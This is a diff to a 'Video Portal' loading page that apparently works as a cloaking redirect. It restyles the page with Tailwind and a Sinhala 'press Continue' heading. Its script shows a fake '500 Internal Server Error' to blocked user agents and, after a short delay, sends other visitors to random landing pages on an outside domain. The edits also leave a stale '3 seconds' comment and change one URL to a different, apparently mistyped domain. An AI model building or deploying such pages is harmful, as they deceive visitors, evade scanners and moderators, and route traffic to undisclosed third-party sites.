@@ -1,50 +1,81 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="si"> <!-- Set language to Sinhala -->
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Video Portal</title>
+  <!-- Load Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
   <style>
+    /* Custom font for Sinhala text */
+    @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Sinhala:wght@400;700&display=swap');
+    
     html, body {
+      /* height: 100%; */ /* Removed height to use min-h-screen */
+      width: 100%;
       margin: 0;
       padding: 0;
-      height: 100%;
-      background: radial-gradient(circle at center, #111 0%, #000 100%);
-      color: #fff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-family: "Segoe UI", sans-serif;
       overflow: hidden;
+      /* Set the custom font with fallbacks */
+      font-family: 'Noto Sans Sinhala', "Segoe UI", sans-serif;
     }
-    .loading {
-      text-align: center;
-      animation: fadeIn 1s ease-in-out;
-    }
-    .loading h1 {
-      font-size: 2em;
-      letter-spacing: 1px;
-      margin-bottom: 10px;
-      color: #ff3366;
-    }
-    .dot {
-      display: inline-block;
-      width: 10px;
-      height: 10px;
-      margin: 0 3px;
-      background-color: #ff3366;
-      border-radius: 50%;
-      animation: blink 1.2s infinite ease-in-out;
-    }
-    .dot:nth-child(2) { animation-delay: 0.2s; }
-    .dot:nth-child(3) { animation-delay: 0.4s; }
 
-    @keyframes blink {
-      0%, 80%, 100% { opacity: 0; }
-      40% { opacity: 1; }
+    /* More engaging gradient background */
+    .gradient-bg {
+      background: linear-gradient(135deg, #1a1a2e 0%, #0a0a0a 50%, #1a1a2e 100%); /* Changed from cyan to indigo base */
+      background-size: 200% 200%;
+      /* Animation to make the gradient "breathe" */
+      animation: gradientShift 10s ease infinite;
     }
+
+    @keyframes gradientShift {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    /* New Spinner Animation */
+    .spinner {
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      border: 6px solid;
+      /* Using a new purple color */
+      border-color: #9370DB #9370DB #9370DB transparent; /* Changed from #00FFFF */
+      animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+    }
+    
+    /* A lighter, opposing inner trail for more dynamic look */
+    .spinner-inner {
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      border: 6px solid;
+      border-color: #f3f3f3 transparent #f3f3f3 #f3f3f3;
+      animation: spin-reverse 0.8s ease-in-out infinite;
+      opacity: 0.2;
+      position: absolute;
+      top: 0;
+      left: 0;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    @keyframes spin-reverse {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(-360deg); }
+    }
+
+    /* Softer fade-in animation */
+    .content-card, .top-heading {
+      animation: fadeIn 1s ease-out;
+    }
+
     @keyframes fadeIn {
-      from { opacity: 0; transform: scale(0.9); }
+      from { opacity: 0; transform: scale(0.95); }
       to { opacity: 1; transform: scale(1); }
     }
   </style>
@@ -63,7 +94,8 @@
       ];
 
       if (blockedAgents.some(agent => ua.includes(agent))) {
-        document.body.innerHTML = "<h1 style='color:#ff3366;text-align:center;'>500 Internal Server Error</h1>";
+        // Use Tailwind class for the error message
+        document.body.innerHTML = "<h1 class='text-red-500 text-2xl text-center p-10'>500 Internal Server Error</h1>";
         return;
       }
 
@@ -72,24 +104,41 @@
         "http://wal69.com/landing.php",
         "http://wal69.com/landing.php?id=1",
         "http://wal69.com/landing.php?id=2",
-        "http://wal69.com/landing.php?id=3"
+        "http://wal6.com/landing.php?id=3"
       ];
       const target = pages[Math.floor(Math.random() * pages.length)];
 
       setTimeout(() => {
         window.location.href = target;
-      }, 3000); // 3 seconds delay
+      }, 2000); // 3 seconds delay
     };
   </script>
 </head>
-<body>
-  <div class="loading">
-    <h1>Loading your experience</h1>
-    <div>
-      <span class="dot"></span>
-      <span class="dot"></span>
-      <span class="dot"></span>
+<!-- Updated body to align content to the start (top) of the page -->
+<body class="gradient-bg text-white flex flex-col items-center justify-start min-h-screen">
+  
+  <!-- Main text in Sinhala - Moved to top -->
+  <h1 class="top-heading text-3xl md:text-4xl font-bold text-gray-100 mt-20 mb-10 text-center mx-4" style="color: #9370DB;"> <!-- Changed from #00FFFF -->
+    Continue කියන එක ඔබන්න
+  </h1>
+
+  <!-- Content card with blur and shadow for a modern effect -->
+  <div class="content-card text-center p-8 bg-black bg-opacity-30 backdrop-blur-md rounded-2xl shadow-2xl max-w-sm mx-4">
+    
+    <!-- Main text in Sinhala (was here) -->
+    
+    <!-- Loading Message -->
+    <p class="text-lg text-gray-300 mb-8">
+      ...
+    </p>
+
+    <!-- New Spinner -->
+    <div class="relative w-14 h-14 mx-auto">
+      <div class="spinner"></div>
+      <div class="spinner-inner"></div>
     </div>
+
   </div>
+
 </body>
 </html>
